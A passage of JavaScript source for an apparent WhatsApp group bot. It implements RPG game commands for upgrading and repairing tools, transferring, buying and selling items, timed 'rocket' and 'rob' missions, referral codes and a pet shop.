█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Use Formats *${command} [type]*
Example *${command} fishingRod*

*📌List that can be upgraded*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()
        
        switch (type) {
            case 'fishingrod':
                if (fishingrod == 0) {
                    let lmao = `you don't have *🎣FishingRod* to get it type *${command}craft fishingrod*`
                    return reply(`${lmao}`)
                }
                if (fishingrod > 9) return reply(`*${rpg.emoticon('fishingrod')}FishingRod* you are at max level`)
                let _wood = fishingrod * 100
                let _string = fishingrod * 100
                let _money = fishingrod * 1000000
                if (wood < _wood || string < _string || money < _money) return reply(`Your materials are lacking!!${wood < _wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Your money is less *${_money - money}*` : ''}`)
                user.fishingrod += 1
                user.wood -= _wood * 1
                user.string -= _string * 1
                user.money -= _money * 1
                user.fishingroddurability = 0 
                user.fishingroddurability += fishingrod * 50
                reply(`Successful upgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
                break
            case 'pickaxe':
                if (pickaxe == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('pickaxe')}Pickaxe*
to have it tap *${command}craft Pickaxe*`
                    return reply(`${lmao}`)
                }
                if (pickaxe > 9) return reply(`*${rpg.emoticon('pickaxe')}Pickaxe* you are at max level!!`)
                let __rock = pickaxe * 250
                let __wood = pickaxe * 150
                let __money = pickaxe * 1500000
                if (rock < __rock || wood < __wood || money < __money) return reply(`
Your Material is Insufficient!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Your money is less *${__money - money}*` : ''}`)
                user.pickaxe += 1
                user.wood -= __wood * 1
                user.rock -= __rock * 1
                user.money -= __money * 1
                user.pickaxedurability = 0
                user.pickaxedurability += pickaxe * 50
                reply(`Successful upgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
                break
            case 'sword':
                if (sword == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('sword')}Sword*
to have it tap *${command}craft sword*`
                    return reply(`${lmao}`)
                }
                if (sword > 9) return reply(`*${rpg.emoticon('sword')}Sword* you are at max level!!`)
                let _iron = sword * 250
                let ___wood = sword * 150
                let ___money = sword * 1000000
                if (iron < _iron || wood < ___wood || money < ___money) return reply(`
Your Material is Insufficient!!
${iron < _iron ? `\n${rpg.emoticon('iron')}Your iron is low *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Your money is less *${___money - money}*` : ''}`)
                user.sword += 1
                user.iron -= _iron * 1
                user.wood -= ___wood * 1
                user.money -= ___money * 1
                user.sworddurability = 0 
                user.sworddurability += sword * 50 
                reply(`Successful upgrade *${rpg.emoticon('sword')}Sword*`)
                break
                case 'armor':
                if (armor == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('armor')}Armor*
to have it tap *${command}craft armor*`
                    return reply(`${lmao}`)
                }
                if (armor > 9) return reply(`*${rpg.emoticon('armor')}Armor* you are at max level!!`)
                let _diamond = armor * 5
                let ____wood = armor * 150
                let ____money = armor * 1000000
                if (diamond < _diamond || wood < ____wood || money < ____money) return reply(`
Your Material is Insufficient!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Your diamonds are low *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Your money is less *${____money - money}*` : ''}`)
                user.armor += 1
                user.diamond -= _diamond * 1
                user.wood -= ____wood * 1
                user.money -= ____money * 1
                user.armordurability = 0 
                user.armordurability += sword * 50 
                reply(`Successful upgrade *${rpg.emoticon('armor')}Armor*`)
                break
                case 'atm':
                if (atm == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('atm')}Atm*
to have it tap *${command}craft atm*`
                    return reply(`${lmao}`)
                }
                if (atm > 999) return reply(`*${rpg.emoticon('atm')}Atm* you are at max level!!`)
                let __diamond = atm * 3
                let _emerald = atm * 5
                let _____money = atm * 10000
                if (diamond < __diamond || emerald < _emerald || money < _____money) return reply(`
Your Material is Insufficient!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Your diamonds are low *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Your money is less *${_____money - money}*` : ''}`)
                user.atm += 1
                user.diamond -= __diamond * 1
                user.emerald -= _emerald * 1
                user.money -= _____money * 1
                user.fullatm = 0 
                user.fullatm += atm * 500000000
                reply(`Successful upgrade *${rpg.emoticon('atm')}Atm*`)
                break
            default :
                return reply(`${teks}`)
        }
}
break
//==================================================================
case 'transfer': {
  if (!m.isGroup) return reply(mess.only.group)
function special(type) {
    let b = type.toLowerCase()
    let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
    return special
}

function isNumber(x) {
    return !isNaN(x)
}
const items = [
    'money', 'bank', 'potion', 'trash', 'wood',
    'rock', 'string', 'petFood', 'emerald',
    'diamond', 'gold', 'iron', 'common',
    'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
    'grape', 'apple', 'orange', 'mango', 'banana', 
    'grape seeds', 'apple seeds', 'orange seeds', 'mango seeds', 'banana seeds',
]
    let user = global.db.users[m.sender]
    const item = items.filter(v => v in user && typeof user[v] == 'number')
    let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @234xxxxxx

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
    const type = (args[0] || '').toLowerCase()
    if (!item.includes(type)) return reply(lol)
    const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
    let _user = global.db.users[who]
    if (!who) return m.reply('Tag one, or type the Number!!')
    if (!(who in global.db.users)) return m.reply(`User ${who} not in database`)
    if (user[type] * 1 < count) return m.reply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
    let previous = user[type] * 1
    let _previous = _user[type] * 1
    user[type] -= count * 1
    _user[type] += count * 1
    if (previous > user[type] * 1 && _previous < _user[type] * 1) m.reply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    else {
        user[type] = previous
        _user[type] = _previous
        m.reply(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    }
}
break
//==================================================================
case 'buy': {
  if (!m.isGroup) return reply(mess.only.group)
function isNumber(number) {
    if (!number) return number
    number = parseInt(number)
    return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
    buy: {
        limit: {
            exp: 9999
        },
        chip: {
        	money: 1000000
        },
        exp: {
        	money: 1000
        },
        potion: {
            money: 1250
        },
        trash: {
            money: 40
        },
        wood: {
            money: 700
        },
        rock: {
            money: 850
        },
        string: {
            money: 400
        },
        iron: { 
        	money: 3000
        },
        diamond: {
            money: 500000
        },
        emerald: {
            money: 100000
        },
        gold: {
            money: 100000
        },
        common: {
            money: 2000
        },
        uncommon: {
            money: 20000
        },
        mythic: {
            money: 75000
        },
        legendary: {
            money: 200000
        },
        petfood: {
            money: 3500
        },
        pet: {
            money: 120000
        },
        Wine: {
            money: 2000
        },
        Apple: {
            money: 2000
        },
        Orange: {
            money: 2000
        },
        Mango: {
            money: 2000
        },
        Banana: {
        	money: 2000
        },
        GrapeSeeds: {
            money: 2000
        },
        AppleSeeds: {
            money: 2000
        },
        OrangeSeeds: {
            money: 2000
        },
        MangoSeeds: {
            money: 2000
        },
        BananaSeeds: {
            money: 2000
        },
        bait: {
        	money: 5000
        }     
    },
    sell: {
        limit: {
            exp: 999
        },
        exp: {
        	money: 1
        },
        chip: {
        	money: 1000000
        },
        potion: {
            money: 625
        },
        trash: {
            money: 20
        },
        wood: {
            money: 350
        },
        rock: {
            money: 425
        },
        string: {
            money: 200
        },
        iron: { 
        	money: 1500
        },
        diamond: {
            money: 250000
        },
        emerald: {
            money: 50000
        },
        gold: {
            money: 50000
        },
        common: {
            money: 1000
        },
        uncommon: {
            money: 10000
        },
        mythic: {
            money: 37500
        },
        legendary: {
            money: 100000
        },
        petfood: {
            money: 1750
        },
        pet: {
            money: 60000
        },
        wine: {
            money: 1000
        },
        apple: {
            money: 1000
        },
        orange: {
            money: 1000
        },
        mango: {
            money: 1000
        },
        banana: {
        	money: 1000
        },
        grapeseeds: {
            money: 1000
        },
        appleseeds: {
            money: 1000
        },
        orangeseeds: {
            money: 1000
        },
        mangoseeds: {
            money: 1000
        },
        bebeaten: {
            money: 1000
        },
        bait: {
        	money: 2500
        }
    }
}

    const item = (args[0] || '').toLowerCase()
    if (!item.match('limit') && db.chats[m.chat].rpg == false && m.isGroup) return dfail('rpg', m, Dare)
    let user = db.users[m.sender]
    const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
    let text = ''
    let footer = ''
    let image = ''
    let buttons = ''
    text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
    footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)
    
    const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
    if (!listItems[item]) return m.reply(footer)
    if (command.toLowerCase() == 'buy') {
        let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
        if (user[paymentMethod] < listItems[item][paymentMethod] * total) return m.reply(`You need *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Again, To Buy *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. You just have *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
        user[paymentMethod] -= listItems[item][paymentMethod] * total
        user[item] += total
        return reply(`Selling Success *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Worth *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
    } else {
    	let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
        if (user[item] < total) return m.reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
        user[item] -= total
        user[paymentMethot] += listItems[item][paymentMethot] * total
        return reply(`Selling Success *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Worth *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
    }
}
break
//==================================================================
case 'selectskill': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"One": "⭐",
"Two": "⭐⭐",
"Three": "⭐⭐⭐",
"Four": "⭐⭐⭐⭐",
"Five": "⭐⭐⭐⭐⭐",
"Six": "⭐⭐⭐⭐⭐⭐"
}
   let skil = text.trim().toLowerCase() // to filter text
   if (!skill.includes(skil)) return reply( `Select *skill🃏* what do you want:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use:
${command} <nameskill>
     
Example:
${command} necromancer
`)
    if (user.skill == "") {
        user.skill = skil
        m.reply(`You have selected a Skill ${skil}`)
    } else if (user.skill) {
        m.reply(`You Already Have the skill ${user.skill} Cannot be replaced`)
    }
}
break
//==================================================================
case 'sampah':
case 'rubbish': {
  if (!m.isGroup) return reply(mess.only.group)
const rewards = {
    exp: 500,
    money: 20999,
}

const cooldown = 2592000000
    let user = global.db.users[m.sender]
    if (new Date - user.lastmonthly < cooldown) return reply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
    let text = ''
    for (let reward of Object.keys(rewards)) if (reward in user) {
        user[reward] += rewards[reward]
        text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
    }
    reply('*––––––『 HAPPY 』––––––*\n' + text.trim())
    user.lastmonthly = new Date * 1
}
break

//==================================================================
case 'roket':
case 'rocket': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let user = global.db.users[m.sender]
    let order = global.db.users[m.sender].rokets
    let timers = clockString(_timers)
    let name = user.registered ? user.name: Dare.getName(m.sender)
    let id = m.sender
    let kerja = 'Roket'
    Dare.misi = Dare.misi ? Dare.misi: {}
    if (id in Dare.misi) {
        reply( `Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (user.health < 80) return m.reply(`You Must Have a Minimum of 80Health`)
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let ngerok4 = Math.floor(Math.random() * 10)
        let ngerok5 = Math.floor(Math.random() * 10)

        let ngrk4 = (ngerok4 * 100000)
        let ngrk5 = (ngerok5 * 1000)

        let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Starting flight....
`.trim()

        let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ In flight....
`.trim()

        let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Arrive at your destination....
`.trim()

        let rokit4 = `🌕🚀

➕ Successful Landing.... 👨‍🚀
`.trim()

        let hsl = `
*—[ Skyrocketing Results ${name} ]—*
➕ 🙂 Money = [ ${ngrk4} ]
➕ 🙂 Exp = [ ${ngrk5} ]
➕ 😍 Landing Complete = +1
➕  📥Previous Landing Total : ${order}
`.trim()

        user.money += ngrk4
        user.exp += ngrk5
        user.rokets += 1
        user.health -= 80

		Dare.misi[id] = [
            kerja,
            setTimeout(() => {
                delete Dare.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            reply( hsl)
        }, 27000)

        setTimeout(() => {
            reply( rokit4)
        }, 25000)

        setTimeout(() => {
            reply( rokit3)
        }, 20000)

        setTimeout(() => {
            reply( rokit2)
        }, 15000)

        setTimeout(() => {
            reply( rokit)
        }, 10000)

        setTimeout(() => {
            reply( `🔍 ${name} Search for Location.....`)
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Please wait for ${timers}, to complete the mission again`)
    }
    break
//==================================================================
case 'rob':
case 'robery': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let user = global.db.users[m.sender]
    let __timers = (new Date - user.lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    let id = m.sender
    let kerja = 'Rob'
    Dare.misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        reply( `Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (user.health < 80) return reply('You Must Have a Minimum of 80Health')
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let rndm1 = Math.floor(Math.random() * 10)
        let rndm2 = Math.floor(Math.random() * 10)
        
        let ran1 = (rndm1 * 100000)
        let ran2 = (rndm2 * 1000)

        let jln = `
🏘️          🚗

✔️ Aiming at the target....
`.trim()

        let jln2 = `
🏘️     🚶

➕ Initiate action....
`.trim()

        let jln3 = `
🏘️

➕ Rob....
`.trim()

        let jln4 = `
🚗



🏘️🚓

➕ 🙂Managed to escape....
`.trim()

        let hsl = `
*—[ Hasil rob ]—*

➕ 🙂 Money = [ ${ran1} ]
➕ 🙂 Exp = [ ${ran2} ]
➕ 📦 Rob Done = +1

And your health decreases -80
`.trim()
        user.money += ran1
        user.exp += ran2
        user.health -= 80

		Dare.misi[id] = [
        kerja,
        setTimeout(() => {
            delete Dare.misi[id]
        }, 27000)
    	]
    
        setTimeout(() => {
            reply(hsl)
        }, 27000)

        setTimeout(() => {
            reply(jln4)
        }, 25000)

        setTimeout(() => {
            reply(jln3)
        }, 20000)

        setTimeout(() => {
            reply(jln2)
        }, 15000)

        setTimeout(() => {
            reply(jln)
        }, 10000)

        setTimeout(() => {
            reply('🔍Looking for a House.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Please wait for ${timers}, to complete the mission again`)
    }
    break
//==================================================================
case 'repair': {
if (!m.isGroup) return reply(mess.only.group)
const {default: MessageType } = require ('@whiskeysockets/baileys')

  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].sword = global.db.users[m.sender].sword || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  global.db.users[m.sender].armor = global.db.users[m.sender].armor || 0
  let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

  let caption = `
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼

*❏ RECIPE*
▧ Pickaxe ⛏️
〉  20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

▧ Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

▧ FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

▧ Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`
const sections = [
   {
	title: "REPAIR A TOOLS",
	rows: [
	    {title: "SWORD ⚔️", rowId: ".repair sword", description: "Repair Sword"},
	    {title: "PICKAXE ⛏️", rowId: ".repair pickaxe", description: "Repair Pickaxe"},
	    {title: "FISHINGROD 🥼", rowId: ".repair fishingrod", description: "Repair FishingRod"},
	    {title: "ARMOR 🥼", rowId: ".repair armor", description: "Repair Armor"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: lgocraft,
  buttonText: "R E P A I R",
  sections
}

  try {
    if (/repair/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxedurability > 99) return m.reply('This tool has no damage yet')
          if (user.pickaxe == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Not enough goods!`)
             user.rock -= 20
             user.wood -= 20
             user.iron -= 20
             user.diamond -= 1
             user.pickaxedurability = 100
            m.reply("Successful repair!")
            break
          case 'sword':
          if (user.sworddurability > 99) return m.reply('This tool has no damage yet')
          if (user.sword == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return m.reply(`Not enough goods!`)
             user.wood -= 20
             user.iron -= 20
             user.gold -= 3
             user.diamond -= 1
             user.sworddurability = 100
            m.reply("Successful repair!")
            break
            case 'fishingrod':
          if (user.fishingroddurability > 99) return m.reply('This tool has no damage yet')
          if (user.fishingrod == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Not enough goods!`)
             user.wood -= 20
             user.string -= 20
             user.iron -= 20
             user.diamond -= 1
             user.fishingroddurability = 100
            m.reply("Successful repair!")
            break
            case 'armor':
          if (user.armordurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.armor == 0) return m.reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return m.reply(`Not enough goods!`)
             user.iron -= 15
             user.gold -= 2
             user.diamond -= 1
             user.armordurability = 100
            m.reply("Successful repair!")
            break
          default:
            return await Dare.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return Dare.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'referral': {
  if (!m.isGroup) return reply(mess.only.group)
const { crypto } = require ("crypto")
const xp_first_time = 2500
const xp_link_creator = 15000
const xp_bonus = {
    5: 40000,
   10: 100000,
   20: 250000,
   50: 1000000,
  100: 10000000,
}

  let users = global.db.users
  if (text) {
    if ('ref_count' in users[m.sender]) throw 'Cannot use referral code!'
    let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
    if (!link_creator) throw 'Invalid referral code'
    let count = users[link_creator].ref_count++
    let extra = xp_bonus[count] || 0
    users[link_creator].exp += xp_link_creator + extra
    users[m.sender].exp += xp_first_time
    users[m.sender].ref_count = 0
    m.reply(`
Congratulations!
+${xp_first_time} XP
`.trim())
    m.reply(`
Someone has used your referral code
+${xp_link_creator + extra} XP
`.trim(), link_creator)
  } else {
    let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
    users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
    let command_text = `${command}ref ${code}`
    let command_link = `wa.me/${Dareuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
    let share_text = `
Get ${xp_first_time} XP for those who use the referral link/code below

Referal Code: *${code}*

${command_link}
`.trim()
    m.reply(`
Get ${xp_first_time} XP for those who use the referral link/code below
${users[m.sender].ref_count} people have used your referral code

Kode referal YOU: ${code}

Share the link with friends: ${command_link}

or send a message to a friend wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
  }
}
break
//==================================================================
case 'petstore': 
case 'petshop': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].pedang = global.db.users[m.sender].pedang || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  
  //----------HARGA
  let hdog = 2
  let hcat = 2
  let hhorse = 4
  let hfox = 6
  let hrobo = 10
  
  let hlion = 10
  let hrhinoceros = 10
  let hdragon = 10
  let hcentaur = 10
  let hkyubi = 10
  let hgriffin = 10
  let hphonix = 10
  let hwolf = 10

let logo = `— *P E T   S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 *ABILITY*
Cooming soon...`
const sections = [
   {
	title: "Buy A Pet",
	rows: [
	    {title: "Cat 🐈", rowId: ".petshop cat", description: "Adopt A Cat"},
	    {title: "Dog 🐕", rowId: ".petshop dog", description: "Adopt A Dog"},
	    {title: "Horse 🐎", rowId: ".petshop horse", description: "Adopt A Horse"},
	    {title: "Fox 🦊", rowId: ".petshop fox", description: "Adopt A Fox"},
	    {title: "Robo 🤖", rowId: ".petshop robo", description: "Buy A Robo"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: logo,
  buttonText: "ADOPT ME 🐾",
  sections
}

  try {
    if (/petshop/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'cat':
          if (user.cat > 0) return m.reply('You already have this')
            if(user.pet < hcat) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hcat
            global.db.users[m.sender].cat += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'dog':
          if (user.dog > 0) return m.reply('You already have this')
            if(user.pet < hdog) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hdog
            global.db.users[m.sender].dog += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'fox':
          if (user.fox > 0) return m.reply('You already have this')
            if(user.pet < hfox) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hfox
            global.db.users[m.sender].fox += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'horse':
          if (user.horse > 0) return m.reply('You already have this')
            if(user.pet < hhorse) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hhorse
            global.db.users[m.sender].horse += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'robo':
          if (user.robo > 0) return m.reply('You already have this')
            if(user.pet < hrobo) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hrobo
            global.db.users[m.sender].robo += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'lion':
          if (user.lion > 0) return m.reply('You already have this')
            if(user.pet < hlion) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hlion
            global.db.users[m.sender].lion += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'rhinoceros':
          if (user.rhinoceros > 0) return m.reply('You already have this')
            if(user.pet < hrhinoceros) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hrhinoceros
            global.db.users[m.sender].rhinoceros += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'dragon':
          if (user.dragon > 0) return m.reply('You already have this')
            if(user.pet < hdragon) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hdragon
            global.db.users[m.sender].dragon += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'centaur':
          if (user.centaur > 0) return m.reply('You already have this')
